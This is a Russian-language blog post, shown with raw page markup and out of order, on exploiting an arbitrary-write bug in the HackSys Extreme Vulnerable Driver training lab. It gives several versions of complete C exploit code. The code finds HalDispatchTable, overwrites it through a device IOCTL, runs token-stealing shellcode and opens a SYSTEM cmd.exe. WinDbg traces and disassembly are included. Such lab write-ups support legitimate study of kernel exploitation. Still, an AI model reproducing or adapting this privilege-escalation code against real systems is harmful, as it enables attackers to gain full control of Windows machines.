1024 int main() { __debugbreak(); LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \\n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \\n&quot;, HALUserLand); printf(&quot;\\n\\nHALUserLand: %p\\nntkrnlpaHandle: %p\\ndrivers[i]: %p\\n\\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand + 4); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\\n&quot;, HalDispatchTable); const char* shellcode = &quot;\\x60\\x31\\xC0\\x64\\x8B\\x80\\x24\\x01\\x00\\x00\\x8B\\x40\\x50\\x89\\xC1\\xBA\\x04\\x00\\x00\\x00\\x8B\\x80\\xB8\\x00\\x00\\x00\\x2D\\xB8\\x00\\x00\\x00\\x39\\x90\\xB4\\x00\\x00\\x00\\x75\\xED\\x8B\\x90\\xF8\\x00\\x00\\x00\\x89\\x91\\xF8\\x00\\x00\\x00\\x61\\x31\\xC0\\x5D\\xC2\\x08\\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 58); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; //memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4); //memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4); printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); system(&quot;cmd.exe&quot;); CloseHandle(hDevice); } //printf(&quot;Skipped!\\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } Допиливаем напёрстком сплойт, собираем шелл и Viola! #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; #define ARRAY_SIZE 1024 int main() { __debugbreak(); LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \\n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \\n&quot;, HALUserLand); printf(&quot;\\n\\nHALUserLand: %p\\nntkrnlpaHandle: %p\\ndrivers[i]: %p\\n\\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand + 4); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\\n&quot;, HalDispatchTable); const char* shellcode = &quot;\\x90\\x90\\x90\\x90\\x60\\x31\\xc0\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\\x8b\\x40\\x50\\x89\\xc1\\xba\\x04\\x00\\x00\\x00\\x8b\\x80\\xb8\\x00\\x00\\x00\\x2d\\xb8\\x00\\x00\\x00\\x39\\x90\\xb4\\x00\\x00\\x00\\x75\\xed\\x8b\\x90\\xf8\\x00\\x00\\x00\\x89\\x91\\xf8\\x00\\x00\\x00\\x61\\x31\\xc0\\x83\\xc4\\x24\\x5d\\xc2\\x08\\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 65, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 65); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; //memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4); //memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4); printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); CloseHandle(hDevice); HMODULE ntdll = GetModuleHandleA(&quot;ntdll&quot;); typedef NTSTATUS(NTAPI* PtrNtQueryIntervalProfile)( DWORD ProfileSource, PULONG Interval ); PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;); printf(&quot;[+] Address of NtQueryIntervalProfile: 0x%x.\\n&quot;, _NtQueryIntervalProfile); ULONG whatever; _NtQueryIntervalProfile(2, &amp;whatever); system(&quot;cmd.exe&quot;); } //printf(&quot;Skipped!\\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } В самом конце у нас задача вызвать NtQueryIntervalProfile, что и происходит Если дебагать, можно поставить бряки на NtQueryIntervalProfile и nt!KeQueryIntervalProfile Статья Заметки: Билдил в студии на хосте, в дебаг моде эксплойт работает только под windbg, в релизной версии работает без дебаггера, думаю, из-за vs либ Не забывать osr loader’ом загружать драйвер, если при первой загрузке не поставил automatic В теории можно сохранять значение по адресу HalDispatchTable+0x4 и после получения шелла восстанавливать его обратно, чтобы винда не падала (это проиходит при ребуте, так что не важно), но мне лень :) Заметки:Следующий способ найти HalDispatchTable Воспользуемся NtQuerySystemInformation Фишка для windbg по пути: вот мы собираем какой-то юзермодный файлик, который будет к драйверу обращаться (например наш де код) и нам бы надо пересобрать .cpp и в том числе .pdb, но дескриптор на .pdb открыт, мы его подгрузили в windbg. Можно выгрузить модули с помощью .reload /u перекомпилить код и загрузить снова .sympath+ C:\\path\\to\\pdb\\file; .reload Если хотим глядеть сорцы в windbg, надо сначала прожать File –&gt; Open Source File, когда стоплнулся код на брейлпоинте в проге, а уже потом прописать .reload и всё будет работать: Нет активной отладки в сорцах, но в дизасме прога стопнулась: .reload и подключилась активная отладка: И так, к NtQuerySystemInformation Код получился вот такой: #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define MAXIMUM_FILENAME_LENGTH 255 #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; int main() { __debugbreak(); typedef struct SYSTEM_MODULE { ULONG Reserved1; ULONG Reserved2; PVOID ImageBaseAddress; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w018; WORD NameOffset; BYTE Name[MAXIMUM_FILENAME_LENGTH]; }SYSTEM_MODULE, * PSYSTEM_MODULE; typedef struct SYSTEM_MODULE_INFORMATION { ULONG ModulesCount; SYSTEM_MODULE Modules[1]; } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION; typedef enum _SYSTEM_INFORMATION_CLASS { SystemModuleInformation = 11, SystemHandleInformation = 16 } SYSTEM_INFORMATION_CLASS; ULONG len = 0; PSYSTEM_MODULE_INFORMATION pModuleInfo; NTSTATUS WINAPI NtQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); HMODULE ntdll = GetModuleHandle(L&quot;ntdll&quot;); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, &quot;NtQuerySystemInformation&quot;); if (query == NULL) { wprintf(L&quot;[!] GetModuleHandle Failed\\n&quot;); return 1; } query(SystemModuleInformation, NULL, 0, &amp;len); pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); if (pModuleInfo == NULL) { wprintf(L&quot;[!] Failed to allocate memory\\n&quot;); return 1; } query(SystemModuleInformation, pModuleInfo, len, &amp;len); if (!len) { wprintf(L&quot;[!] Failed to retrieve system module information\\n&quot;); return 1; } PVOID kernelImageBase = pModuleInfo-&gt;Modules[0].ImageBaseAddress; PCHAR kernelImage = (PCHAR)pModuleInfo-&gt;Modules[0].Name; kernelImage = strrchr(kernelImage, &#39;\\\\&#39;) + 1; wprintf(L&quot;[+] Kernel Image name %S\\n&quot;, kernelImage); wprintf(L&quot;[+] Kernel Image Base %p\\n&quot;, kernelImageBase); HMODULE KernelHandle = LoadLibraryA(kernelImage); wprintf(L&quot;[+] Kernel Handle %p\\n&quot;, KernelHandle); PVOID HALUserLand = (PVOID)GetProcAddress(KernelHandle, &quot;HalDispatchTable&quot;); wprintf(L&quot;[+] HalDispatchTable userland %p\\n&quot;, HALUserLand); PVOID HalDispatchTable = (PVOID)((ULONG)kernelImageBase - (ULONG)KernelHandle + (ULONG)HALUserLand + 4); wprintf(L&quot;[~] HalDispatchTable Kernel %p\\n&quot;, HalDispatchTable); printf(&quot;[~] HalDispatchTable Kernel: %p\\n&quot;, HalDispatchTable); const char* shellcode = &quot;\\x90\\x90\\x90\\x90\\x60\\x31\\xc0\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\\x8b\\x40\\x50\\x89\\xc1\\xba\\x04\\x00\\x00\\x00\\x8b\\x80\\xb8\\x00\\x00\\x00\\x2d\\xb8\\x00\\x00\\x00\\x39\\x90\\xb4\\x00\\x00\\x00\\x75\\xed\\x8b\\x90\\xf8\\x00\\x00\\x00\\x89\\x91\\xf8\\x00\\x00\\x00\\x61\\x31\\xc0\\x83\\xc4\\x24\\x5d\\xc2\\x08\\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 65, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 65); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; printf(&quot;[+] Starting interaction with the driver\\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); CloseHandle(hDevice); //HMODULE ntdll = GetModuleHandleA(&quot;ntdll&quot;); typedef NTSTATUS(NTAPI* PtrNtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval); PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;); printf(&quot;[+] Address of NtQueryIntervalProfile: 0x%x.\\n&quot;, _NtQueryIntervalProfile); ULONG whatever; _NtQueryIntervalProfile(2, &amp;whatever); system(&quot;cmd.exe&quot;); return 0; } Статья Сорцы","headline":"Windows Kernel Exploitation 0x02 Arbitrary Write [ru]","image":"/assets/previews/11.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/09/22/Windows-Kernel-Exploitation-0x02.html"},"url":"/2022/09/22/Windows-Kernel-Exploitation-0x02.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <p>В следующей лабе видим структуру:</p>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryWrite.h">link</a></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_WRITE_WHAT_WHERE</span>
<span class="p">{</span>
    <span class="n">PULONG_PTR</span> <span class="n">What</span><span class="p">;</span>
    <span class="n">PULONG_PTR</span> <span class="n">Where</span><span class="p">;</span>
<span class="p">}</span> <span class="n">WRITE_WHAT_WHERE</span><span class="p">,</span> <span class="o">*</span><span class="n">PWRITE_WHAT_WHERE</span><span class="p">;</span>
</code></pre></div></div>

<p>А в конце:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NTSTATUS</span>
<span class="nf">TriggerArbitraryWrite</span><span class="p">(</span>
    <span class="n">_In_</span> <span class="n">PWRITE_WHAT_WHERE</span> <span class="n">UserWriteWhatWhere</span>
<span class="p">);</span>
</code></pre></div></div>

<p>К сорцам:</p>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/ArbitraryWrite.c">link</a></p>

<p>Собственно запустим сплойт, посмотрим windbg:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IO_CODE 0x22200B
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    
    <span class="kt">char</span> <span class="o">*</span><span class="n">poc</span> <span class="o">=</span> <span class="s">"AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp"</span><span class="p">;</span>
    <span class="c1">//printf("%d", sizeof(poc));</span>
    <span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="n">poc</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="c1">//system("cmd.exe");</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>И получим:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">******</span> <span class="nx">HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE</span> <span class="o">******</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserWriteWhatWhere</span><span class="p">:</span> <span class="mh">0x0040409C</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">WRITE_WHAT_WHERE</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserWriteWhatWhere</span><span class="o">-&gt;</span><span class="nx">What</span><span class="p">:</span> <span class="mh">0x41414141</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserWriteWhatWhere</span><span class="o">-&gt;</span><span class="nx">Where</span><span class="p">:</span> <span class="mh">0x42424242</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Arbitrary</span> <span class="nx">Overwrite</span>
<span class="nx">Break</span> <span class="nx">instruction</span> <span class="nx">exception</span> <span class="o">-</span> <span class="nx">code</span> <span class="mi">80000003</span> <span class="p">(</span><span class="nx">first</span> <span class="nx">chance</span><span class="p">)</span>
<span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerArbitraryOverwrite</span><span class="o">+</span><span class="mh">0x5e</span><span class="p">:</span>
<span class="nx">a8353b66</span> <span class="mi">83</span><span class="nx">c424</span>          <span class="nx">add</span>     <span class="nx">esp</span><span class="p">,</span><span class="mi">24</span><span class="nx">h</span>
<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">g</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">Exception</span> <span class="nx">Code</span><span class="p">:</span> <span class="mh">0xC0000005</span>
<span class="o">******</span> <span class="nx">HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE</span> <span class="o">******</span>
</code></pre></div></div>

<p>Собственно, что дальше-то? Сама дыра заключается в возможности писать произвольные данные по произвольному адресу. Обычно, возможности урезаются митигациями или в целом самой дырой (можно писать 1 байт / 1 бит / только по адресам выше N и тд)</p>

<p>В самом коде показан способ защиты: проверка на то, что адреса из пространства ядра</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ProbeForRead</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">What</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
<span class="n">ProbeForWrite</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">Where</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</code></pre></div></div>

<p>С <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforread">msdn’а</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The ProbeForRead routine checks that a user-mode buffer
actually resides in the user portion of the address space, and is correctly aligned.

If the specified range of memory is not within the user-mode address range,
ProbeForRead raises the STATUS_ACCESS_VIOLATION exception.
</code></pre></div></div>

<p>В этот раз у нас нет возможности просто прыгнуть на код, адрес которого мы передадим. Нам нужно переписать кукую-то бесполезную функцию, которая редко вызывается, шеллкодом, и уже тогда она сама вызовется.</p>

<p>Переписывать функцию будем в HalDispatchTable (Hardware Abstraction Layer Dispatch Table)</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nt</span><span class="o">!</span><span class="nx">NtQueryIntervalProfile</span><span class="p">:</span>
<span class="mi">82921073</span> <span class="mi">6</span><span class="nx">a0c</span>            <span class="nx">push</span>    <span class="mi">0</span><span class="nx">Ch</span>
<span class="mi">82921075</span> <span class="mi">68880</span><span class="nx">c6682</span>      <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">nt</span><span class="o">!</span> <span class="o">??</span> <span class="p">::</span><span class="nx">FNODOBFM</span><span class="p">::</span><span class="s2">`string'+0xd08 (82660c88)
8292107a e871b4d6ff      call    nt!_SEH_prolog4 (8268c4f0)
8292107f 64a124010000    mov     eax,dword ptr fs:[00000124h]
82921085 8a983a010000    mov     bl,byte ptr [eax+13Ah]
8292108b 84db            test    bl,bl
8292108d 743e            je      nt!NtQueryIntervalProfile+0x5a (829210cd)
8292108f 8365fc00        and     dword ptr [ebp-4],0
82921093 8b750c          mov     esi,dword ptr [ebp+0Ch]
82921096 8bce            mov     ecx,esi
82921098 a154987782      mov     eax,dword ptr [nt!MmUserProbeAddress (82779854)]
8292109d 3bf0            cmp     esi,eax
8292109f 7202            jb      nt!NtQueryIntervalProfile+0x30 (829210a3)
829210a1 8bc8            mov     ecx,eax
829210a3 8b01            mov     eax,dword ptr [ecx]
829210a5 8901            mov     dword ptr [ecx],eax
829210a7 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
829210ae eb20            jmp     nt!NtQueryIntervalProfile+0x5d (829210d0)
829210b0 8b45ec          mov     eax,dword ptr [ebp-14h]
829210b3 8b00            mov     eax,dword ptr [eax]
829210b5 8b00            mov     eax,dword ptr [eax]
829210b7 8945e4          mov     dword ptr [ebp-1Ch],eax
829210ba 33c0            xor     eax,eax
829210bc 40              inc     eax
829210bd c3              ret
829210be 8b65e8          mov     esp,dword ptr [ebp-18h]
829210c1 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh
829210c8 8b45e4          mov     eax,dword ptr [ebp-1Ch]
829210cb eb39            jmp     nt!NtQueryIntervalProfile+0x93 (82921106)
829210cd 8b750c          mov     esi,dword ptr [ebp+0Ch]
829210d0 8b4508          mov     eax,dword ptr [ebp+8]
829210d3 85c0            test    eax,eax
829210d5 7507            jne     nt!NtQueryIntervalProfile+0x6b (829210de)
829210d7 a1f48b7382      mov     eax,dword ptr [nt!KiProfileInterval (82738bf4)]
829210dc eb05            jmp     nt!NtQueryIntervalProfile+0x70 (829210e3)
829210de e88cbcfbff      call    nt!KeQueryIntervalProfile (828dcd6f)


nt!KeQueryIntervalProfile:
828dcd6f 8bff            mov     edi,edi
828dcd71 55              push    ebp
828dcd72 8bec            mov     ebp,esp
828dcd74 83ec10          sub     esp,10h
828dcd77 83f801          cmp     eax,1
828dcd7a 7507            jne     nt!KeQueryIntervalProfile+0x14 (828dcd83)
828dcd7c a168407782      mov     eax,dword ptr [nt!KiProfileAlignmentFixupInterval (82774068)]
828dcd81 c9              leave
828dcd82 c3              ret
828dcd83 8945f0          mov     dword ptr [ebp-10h],eax
828dcd86 8d45fc          lea     eax,[ebp-4]
828dcd89 50              push    eax
828dcd8a 8d45f0          lea     eax,[ebp-10h]
828dcd8d 50              push    eax
828dcd8e 6a0c            push    0Ch
828dcd90 6a01            push    1
828dcd92 ff1544947382    call    dword ptr [nt!HalDispatchTable+0x4 (82739444)]

nt!HalDispatchTable --&gt; 82739440
</span></code></pre></div></div>

<h3 id="способы-найти-haldispatchtable"><a href="#header-3"></a>Способы найти HalDispatchTable</h3>

<p>1) Энумерируем все адреса драйверов с помощью EnumDeviceDrivers()</p>

<p>2) Ищем среди них адрес <code class="language-plaintext highlighter-rouge">ntoskrnl</code> (ntoskrnl.exe экспортирует KeQueryIntervalProfile())</p>

<p>3) Передаем хендл на ntoskrnl.exe в LoadLibraryExA и затем энумерируем адрес HalDispatchTable с помощью GetProcAddress</p>

<p>4) Как только адрес HalDispatchTable найден, мы можем посчитать адрес HalDispatchTable + 0x4 (добавив 4 байта) и переписать адрес на адрес нашего шеллкода в юзерспейсе.</p>

<p>4 байта добавляем, потому что по структуре HalDispatchTable в первых 4/8 байтах версия</p>

<p><img src="/assets/post_images/1.png" alt="Handles" /></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
